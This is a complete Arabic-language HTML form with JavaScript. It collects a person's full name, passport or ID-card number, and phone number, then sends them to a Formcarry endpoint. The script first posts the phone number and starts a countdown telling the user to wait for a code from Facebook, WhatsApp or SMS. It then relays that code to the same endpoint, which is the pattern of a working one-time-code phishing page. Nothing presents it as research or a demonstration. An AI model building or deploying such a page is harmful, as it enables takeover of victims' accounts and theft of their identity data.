<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>نموذج البيانات</title>
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background-color: #f2f2f2;
      padding: 20px;
    }

    .form-container {
      max-width: 600px;
      margin: auto;
      background: #fff;
      padding: 25px;
      border-radius: 12px;
      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
    }

    .form-group {
      margin-bottom: 15px;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }

    input, select {
      width: 100%;
      padding: 8px;
      border-radius: 5px;
      border: 1px solid #ccc;
      font-size: 14px;
    }

    .phone-row {
      display: flex;
      gap: 10px;
      align-items: center;
    }

    .phone-row input {
      flex: 1;
    }

    .phone-row button {
      flex-shrink: 0;
      padding: 8px 12px;
      font-size: 14px;
    }

    .code-row {
      display: flex;
      gap: 10px;
      align-items: flex-end;
    }

    .code-row input {
      flex: 1;
    }

    .code-row button {
      flex-shrink: 0;
      padding: 8px 12px;
      font-size: 14px;
      height: 38px;
    }

    button {
      background-color: #007bff;
      color: #fff;
      border: none;
      border-radius: 6px;
      padding: 10px 15px;
      cursor: pointer;
      font-size: 15px;
      margin-top: 10px;
      transition: background-color 0.3s ease;
    }

    button:hover:not(:disabled) {
      background-color: #0056b3;
    }

    button:disabled {
      background-color: #cccccc;
      cursor: not-allowed;
    }

    .status-message {
      margin-top: 15px;
      font-weight: bold;
      display: none;
    }

    .loading { color: orange; }
    .error { color: red; }
    .success { color: green; }
  </style>
</head>
<body>

  <div class="form-container">
    <h3>نموذج جمع البيانات</h3>
    <form id="fullForm">

      <!-- الاسم الكامل -->
      <div class="form-group">
        <label for="name">الاسم الكامل (أحرف عربية فقط)</label>
        <input type="text" id="name" name="name" required />
      </div>

      <!-- اختيار نوع الوثيقة -->
      <div class="form-group">
        <label for="docType">نوع الوثيقة</label>
        <select id="docType" name="docType" required onchange="showDocInput()">
          <option value="">اختر النوع</option>
          <option value="جواز سفر">جواز سفر</option>
          <option value="بطاقة شخصية">بطاقة شخصية</option>
        </select>
      </div>

      <!-- رقم الوثيقة -->
      <div class="form-group" id="docGroup" style="display: none;">
        <label id="docLabel" for="docNumber">رقم الوثيقة</label>
        <input type="text" id="docNumber" name="docNumber" required />
      </div>

      <!-- رقم الهاتف وزر إرسال الكود -->
      <div class="form-group">
        <label>رقم الهاتف</label>
        <div class="phone-row">
          <input type="tel" id="phone" name="phone" required />
          <button type="button" id="sendPhoneBtn" onclick="sendPhoneOnly()">أرسل الكود</button>
        </div>
        <div id="countdownMsg" style="margin-top: 5px; font-size: 14px; color: green;"></div>
      </div>

      <!-- كود الاستلام + زر إرسال الكود فقط -->
      <div class="form-group code-row">
        <div>
          <label for="code">كود الاستلام</label>
          <input type="text" id="code" name="code" required />
        </div>
        <button type="button" onclick="sendCodeOnly()">أرسل الكود فقط</button>
      </div>

      <button type="submit" id="submitBtn">إرسال جميع البيانات</button>

      <div class="status-message" id="statusMsg"></div>
    </form>
  </div>

<script>
  const formcarryURL = "https://formcarry.com/s/your-formcarry-id"; // غيّر هنا برابطك الصحيح

  // تحقق من أن الاسم عربي فقط
  document.getElementById("name").addEventListener("input", function () {
    const arabicOnly = /^[\u0600-\u06FF\s]+$/;
    if (!arabicOnly.test(this.value)) {
      this.setCustomValidity("يرجى إدخال أحرف عربية فقط");
    } else {
      this.setCustomValidity("");
    }
  });

  // إظهار/إخفاء حقل رقم الوثيقة وتغيير التسميه حسب الاختيار
  function showDocInput() {
    const type = document.getElementById("docType").value;
    const group = document.getElementById("docGroup");
    const label = document.getElementById("docLabel");
    if (type) {
      label.textContent = "رقم " + type;
      group.style.display = "block";
    } else {
      group.style.display = "none";
    }
  }

  // إرسال رقم الهاتف فقط والبدء بعد تنازلي 5 دقائق
  let countdownStarted = false;
  let countdownTimeout;

  function sendPhoneOnly() {
    const phone = document.getElementById("phone").value.trim();
    const msg = document.getElementById("countdownMsg");
    const sendPhoneBtn = document.getElementById("sendPhoneBtn");

    if (!phone) {
      alert("يرجى إدخال رقم الهاتف أولاً.");
      return;
    }

    if (countdownStarted) {
      alert("⏳ الرجاء الانتظار حتى انتهاء العد التنازلي قبل إعادة الإرسال.");
      return;
    }

    fetch(formcarryURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone: phone })
    })
    .then(response => {
      if (response.ok) {
        msg.style.color = "green";
        msg.textContent = "✅ تم إرسال رقم الهاتف بنجاح. الرجاء انتظار الكود...";
        startTimer(5 * 60);
        countdownStarted = true;
        sendPhoneBtn.disabled = true;
      } else {
        msg.style.color = "red";
        msg.textContent = "❌ فشل في إرسال رقم الهاتف.";
      }
    })
    .catch(() => {
      msg.style.color = "red";
      msg.textContent = "❌ حدث خطأ أثناء إرسال رقم الهاتف.";
    });
  }

  function startTimer(seconds) {
    const msg = document.getElementById("countdownMsg");
    const sendPhoneBtn = document.getElementById("sendPhoneBtn");
    clearTimeout(countdownTimeout);

    function update() {
      const min = Math.floor(seconds / 60);
      const sec = seconds % 60;
      msg.textContent = `⏳ الرجاء الانتظار ${min}:${sec < 10 ? '0' : ''}${sec} دقيقة لاستلام الكود من فيسبوك أو واتساب أو SMS.`;
      if (seconds > 0) {
        seconds--;
        countdownTimeout = setTimeout(update, 1000);
      } else {
        msg.textContent = "⌛ انتهى الوقت. يمكنك إعادة إرسال الكود.";
        msg.style.color = "orange";
        countdownStarted = false;
        sendPhoneBtn.disabled = false;
      }
    }
    update();
  }

  // إرسال الكود فقط مع رقم الهاتف
  function sendCodeOnly() {
    const phone = document.getElementById("phone").value.trim();
    const code = document.getElementById("code").value.trim();

    if (!phone) {
      alert("يرجى إدخال رقم الهاتف أولاً.");
      return;
    }
    if (!code) {
      alert("يرجى إدخال كود الاستلام أولاً.");
      return;
    }

    fetch(formcarryURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone: phone, code: code })
    })
    .then(response => {
      if (response.ok) {
        alert("✅ تم إرسال الكود بنجاح!");
      } else {
        alert("❌ فشل في إرسال الكود. حاول مجددًا.");
      }
    })
    .catch(() => {
      alert("❌ حدث خطأ أثناء الإرسال.");
    });
  }

  // إرسال جميع البيانات إلى Formcarry
  document.getElementById("fullForm").addEventListener("submit", function (e) {
    e.preventDefault();

    // التحقق من رقم الوثيقة إذا كان ظاهر
    const docGroup = document.getElementById("docGroup");
    if (docGroup.style.display === "block") {
      const docNumInput = document.getElementById("docNumber");
      if (!docNumInput.value.trim()) {
        alert("يرجى إدخال رقم الوثيقة.");
        docNumInput.focus();
        return;
      }
    }

    const data = {
      name: document.getElementById("name").value.trim(),
      docType: document.getElementById("docType").value,
      docNumber: document.getElementById("docNumber").value.trim(),
      phone: document.getElementById("phone").value.trim(),
      code: document.getElementById("code").value.trim()
    };

    const submitBtn = document.getElementById("submitBtn");
    submitBtn.disabled = true;
    showMessage("⏳ جاري الإرسال...", "loading");

    fetch(formcarryURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    })
    .then(response => {
      if (response.ok) {
        showMessage("✅ تم إرسال البيانات بنجاح!", "success");
        document.getElementById("fullForm").reset();
        document.getElementById("docGroup").style.display = "none";
        document.getElementById("countdownMsg").textContent = "";
      } else {
        showMessage("❌ فشل الإرسال. حاول مرة أخرى.", "error");
      }
      submitBtn.disabled = false;
    })
    .catch(() => {
      showMessage("❌ حدث خطأ في الاتصال.", "error");
      submitBtn.disabled = false;
    });
  });

  function showMessage(message, type) {
    const msg = document.getElementById("statusMsg");
    msg.textContent = message;
    msg.className = `status-message ${type}`;
    msg.style.display = "block";
  }
</script>

</body>
</html>
